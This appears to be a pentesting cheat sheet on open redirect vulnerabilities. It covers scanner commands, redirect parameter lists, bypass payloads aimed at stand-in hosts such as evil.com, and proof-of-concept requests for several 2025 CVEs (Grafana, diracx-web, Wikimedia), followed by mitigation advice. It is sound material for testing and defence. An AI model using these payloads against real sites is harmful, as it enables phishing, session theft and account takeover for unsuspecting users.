# Open Redirects

## Overview

Open redirect vulnerabilities occur when a web application accepts user-controlled input that specifies a URL to which the user will be redirected after certain actions. If the application does not properly validate these inputs, attackers can craft malicious URLs that redirect users to phishing sites or other malicious destinations while appearing to come from a trusted source .

## Tools

```bash
# OpenRedireX - Advanced open redirect scanner
# https://github.com/devanshbatham/OpenRedireX
python3 openredirex.py -u "https://website.com/?url=FUZZ" -p payloads.txt --keyword FUZZ

# Oralyzer - Open Redirection Analyzer with DOM XSS and CRLF detection
# https://github.com/0xNanda/Oralyzer
python3 oralyzer.py -u https://website.com/redir?url=

# Payload generator
# https://gist.github.com/zPrototype/b211ae91e2b082420c350c28b6674170
```

Oralyzer can identify three types of open redirect vulnerabilities: Header Based, Javascript Based, and Meta Tag Based .

## Quick Discovery

```bash
# One-liner with gf pattern matching
echo "domain.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew

# Search in Burp Suite
# Look for patterns: "=http" or "=aHR0c" (base64 encoded "http")
```

## Redirect Parameters to Test

Comprehensive list of common URL redirection parameters :

| Category | Parameters |
|----------|------------|
| Explicit Redirect | `redirect`, `redirect_to`, `redirect_url`, `redir`, `redirect_uri` |
| Return URLs | `return`, `return_to`, `return_url`, `returnTo`, `return_path` |
| Navigation | `next`, `goto`, `forward`, `continue`, `checkout_url` |
| URL Parameters | `url`, `uri`, `link`, `site`, `file_url`, `image_url` |
| Destination | `dest`, `destination`, `target`, `to`, `out` |
| Callback | `callback`, `backto`, `backurl`, `view`, `go` |

## Payloads for Intruder

```bash
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```

## Valid Redirect URLs

```bash
http(s)://evil.com
http(s):\\evil.com
//evil.com
///evil.com
/\evil.com
\/evil.com
/\/evil.com
\\evil.com
\/\evil.com
/ /evil.com
\ \evil.com
```

## Encoded and Bypass Payloads

```bash
# Basic redirect checks
https://web.com/r/?url=https://phishing-malicious.com

# Using @ symbol (browser ignores everything before @)
http://www.theirsite.com@yoursite.com/

# Double URL encoding
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com

# Protocol-relative URLs
/http://twitter.com/
/\\twitter.com
/\/twitter.com

# Using Unicode characters (lookalike domains)
/?redir=google。com
//google%E3%80%82com

# Null byte injection
//google%00.com

# Whitespace and tab bypass
/%09/google.com
/%5cgoogle.com

# Path traversal in redirect
//www.google.com/%2f%2e%2e
//www.google.com/%2e%2e
//google.com/%2f..
//\google.com
/\victim.com:80%40google.com

# Multiple slashes technique
https://target.com///google.com//

# Remember: Always URL encode your payloads!
```

## Real-World Exploit Examples

### CVE-2025-4123: Grafana Open Redirect to Stored XSS and SSRF

In 2025, a high-severity vulnerability was discovered in Grafana OSS and Enterprise versions 8.x through 12.x. This vulnerability allowed unauthenticated attackers to chain multiple flaws for account takeover .

**Exploit Chain:**
1. Open redirect via path traversal in the public redirect handler
2. Stored XSS through malicious plugin injection
3. Full-read SSRF if the Image Renderer plugin was installed

**Proof of Concept - Open Redirect:**
```http
GET /public/..%2F%5cevil.com%2F%3f%2F..%2F.. HTTP/1.1
Host: vulnerable-grafana.com
```

The crafted request caused the server to redirect to an attacker-controlled domain due to improper validation of traversal characters in the path .

**Impact:**
- CVSS v3.1 Score: 7.6 (High)
- Account takeover (including admin accounts)
- Persistent compromise of the Grafana instance
- Internal network access via SSRF
- Cloud service compromise in AWS/GCP/Azure environments

**Mitigation:**
- Patch to versions 10.4.18+, 11.2.9+, 11.6.1+, or 12.0.0+
- Disable anonymous access
- Restrict plugin loading to signed plugins only
- Enable strict CSP headers

### CVE-2025-6023 and Bypass: Grafana Login Redirect Vulnerability

A sophisticated open redirect vulnerability in Grafana's login functionality demonstrated how validation flaws can be exploited .

**Technical Root Cause:**
The vulnerability existed in the `ValidateRedirectTo()` function in login.go. Go's `url.Parse()` function separates a URL's path from its fragment (#), but the validation code only checked the path. The malicious payload was hidden in the fragment, which was ignored by the server-side check but executed by the victim's browser.

**Exploit Payload:**
```http
GET /user/auth-tokens/rotate?redirectTo=/%23/..//\/attacker.com HTTP/1.1
```

**How it worked:**
1. `url.Parse()` splits at `#`: `to.Path` = `/`, `to.Fragment` = `/..//\/attacker.com`
2. Validation checked only `to.Path` (which was safely `/`)
3. The handler constructed a Location header using the original string
4. Victim's browser received: `Location: /\/attacker.com`
5. Browser interpreted this as a redirect to attacker.com

**Combined with Client-Side Path Traversal for XSS:**
The second bypass exploited the `validatePath()` function which performed security checks on a transformed string but returned the original unmodified path:

```http
GET /dashboard/script/%253f%2f..%2f..%2f..%2f..%2f..%2fuser/auth-tokens/rotate?redirectTo=/%23/..//\/attacker.com/module.js
```

This chained vulnerability allowed full account takeover through session theft.

### CVE-2025-54066: DIRACGrid diracx-web Open Redirect

In July 2025, an open redirect vulnerability was disclosed in DIRACGrid's diracx-web application affecting versions prior to 0.1.0-a8 .

**Vulnerability Details:**
The login page contained a `redirect` field specifying where to send users after authentication. This URI was not verified, allowing arbitrary redirection. Parameter pollution techniques could hide malicious URIs.

**Exploit Scenario:**
1. Attacker crafts a login URL with malicious redirect parameter
2. Authenticated user clicks the link
3. After login, user is redirected to attacker-controlled phishing site
4. Phishing site mimics legitimate login page to harvest credentials

**CVSS Score:** 4.7 (Medium)
**Fixed in version:** 0.1.0-a8

### Wikimedia Foundation Open Redirect (2025)

A security researcher discovered an open redirect vulnerability in Wikimedia's payment processing system .

**Proof of Concept:**
```
https://embed.wikimedia.gr4vy.app/start-method.html?authUrl=https://api.wikimedia.gr4vy.app/three-d-secure-auth?&redirectUrl=https://evil.com
```

**Technical Analysis:**
By intercepting and modifying the response from `https://payments.wikimedia.org/api.php`, an attacker could inject:
```json
{
  "result": {
    "redirect": "https://embed.wikimedia.gr4vy.app/start-method.html?authUrl=https://api.wikimedia.gr4vy.app/three-d-secure-auth?&redirectUrl=https://evil.com"
  }
}
```

This demonstrated that even well-maintained platforms like Wikimedia can have open redirect vulnerabilities in payment processing workflows.

## Advanced Bypass Techniques

### Parameter Pollution
When applications validate the first occurrence of a parameter but use the last, attackers can inject malicious values:

```
https://target.com/login?redirect=/safe&redirect=https://evil.com
```

### Fragment-Based Bypass
As demonstrated in CVE-2025-6023, hiding malicious payloads in URL fragments can bypass server-side validation:

```
https://target.com/redirect?url=/safe#https://evil.com
```

### Double Encoding
```
https://target.com/redirect?url=%252f%252fevil.com
# Decoded twice: //evil.com
```

### CRLF Injection for Open Redirect
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

## Detection in Burp Suite

1. **Parameter Discovery:** Use Burp Suite's parameter discovery or crawl the application
2. **Filter for Redirect Parameters:** Search for patterns like `=http`, `=https`, `=aHR0c`
3. **Intruder Payload Positions:** Insert payloads into each redirect parameter
4. **Analyze Responses:** Look for 302/301 status codes with Location headers pointing to external domains

## Mitigation Recommendations

1. **Allowlist Validation:** Only permit redirects to trusted domains within the application's scope
2. **Canonicalization:** Normalize and validate URLs before processing
3. **Input Validation:** Reject URLs containing encoded characters like `%2f`, `%5c`, `%2e%2e`
4. **Content Security Policy:** Implement strict CSP headers to restrict redirect destinations
5. **User Confirmation:** Display warning messages when redirecting to external domains
6. **Disable Open Redirects:** Where possible, avoid implementing redirect functionality or restrict it to server-relative paths only

## References

- PayloadsAllTheThings Open Redirect: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- OpenRedireX Tool: https://github.com/devanshbatham/OpenRedireX
- Oralyzer Tool: https://github.com/0xNanda/Oralyzer
- Open Redirect Fuzzing List: https://github.com/m0chan/BugBounty/blob/master/OpenRedirectFuzzing.txt
